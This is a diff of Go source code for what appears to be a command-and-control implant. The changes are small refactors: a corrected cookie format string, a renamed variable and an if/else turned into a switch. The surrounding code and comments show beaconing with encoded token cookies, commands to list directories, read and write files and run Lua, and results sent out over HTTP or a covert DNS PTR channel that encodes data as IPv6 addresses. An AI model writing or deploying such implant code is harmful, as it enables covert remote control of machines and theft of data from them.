@@ -54,15 +54,15 @@ func main() {
 
 		// Prepare the hmac params (timestamp and token)
 		// params := http.Cookie{}
-		hardVals := fmt.Sprintf("timestamp=%s&token=%sid=%s", timestamp, token, CompUUID)
+		hardVals := fmt.Sprintf("timestamp=%s&token=%s&id=%s", timestamp, token, CompUUID)
 
 		// compedData is hardVals compressed using zlib
 		// if enabled at compile time, DoComp returns the compressed object and bool true
 		// if disabled (default) the function returns false
 		// if false, the params are instead appended to the request uncompressed
-		compedData, boolRes := shared.DoComp(hardVals)
-		if boolRes {
-			//fmt.Println("Compressing data")
+		compedData, shouldComp := shared.DoComp(hardVals)
+		if shouldComp {
+			//fmt.Println(hardVals)
 			encodedData := base64.StdEncoding.EncodeToString(compedData.Bytes())
 			tokenCookie := &http.Cookie{Name: "da", Value: encodedData}
 			// makeGetRequest 3 times with a 10 second delay between each attempt
@@ -121,7 +121,8 @@ func main() {
 				// A switch statement to run through possible command options, including using the lua engine
 				// List arbitrary dir, read file, write file, execute Lua
 				// Returns the result of execution (stdout or bool) or returns an error
-				if dnsConf == true {
+				switch dnsConf {
+				case true:
 					encRes := shared.StringToIPv6List("test success")
 					err := shared.SendPTRRequest(hexId, encRes)
 					if err != true {
@@ -129,7 +130,7 @@ func main() {
 					}
 					fmt.Println("Success")
 					break
-				} else {
+				case false:
 					impIdCookie := &http.Cookie{Name: "id", Value: CompUUID}
 					request, err := shared.SendDataRequest(postUrl, "test success", maxRetries, impIdCookie)
 					if err != nil {
@@ -209,7 +210,7 @@ func main() {
 				// Returns the result of execution (stdout or bool) or returns an error
 				switch dnsConf {
 				case true:
-					encRes := []string{shared.Ipv6ToPTR("test success")}
+					encRes := shared.StringToIPv6List("test success")
 					err := shared.SendPTRRequest(hexId, encRes)
 					if err != true {
 						return
